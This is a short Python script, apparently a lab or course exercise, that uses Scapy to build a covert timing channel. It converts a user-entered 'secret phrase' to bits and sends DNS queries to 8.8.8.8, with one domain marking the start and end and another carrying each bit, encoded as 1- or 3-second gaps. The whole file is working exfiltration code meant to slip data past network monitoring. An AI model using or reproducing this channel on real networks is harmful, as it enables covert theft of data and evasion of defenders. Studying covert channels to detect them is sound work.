from scapy.all import *
from time import sleep

IP_DST = "8.8.8.8"
# Domains for use that receiver will watch for
DOMAIN_STARTSTOP = "abettorbot.home.blog"
DOMAIN_CONT = "ourgourdandsavior.com"
# Timing between packets that receiver will watch for
ZERO_TIMING = 1
ONE_TIMING = 3

# Get user input
user_input = input("Enter your secret phrase: ")

# Convert user input to binary
bin_user_input = ''.join(format(ord(i), 'b').zfill(8) for i in user_input)

# Create IP packet
p = IP(dst=IP_DST)/UDP(dport=53)/DNS(rd=1, qd=DNSQR())

# Send inital packet saying beginning of transmission
p["DNSQR"].qname = DOMAIN_STARTSTOP
send(p, verbose=False)

# For message, use CONT domain
p["DNSQR"].qname = DOMAIN_CONT

# Loop through binary version of user input and send DNS requests based on timing
for i in bin_user_input:
    if i == '0':
        sleep(ZERO_TIMING)
        send(p, verbose=False)

    elif i == '1':
        sleep(ONE_TIMING)
        send(p, verbose=False)

# Signal end of transmission
p["DNSQR"].qname = DOMAIN_STARTSTOP
send(p)
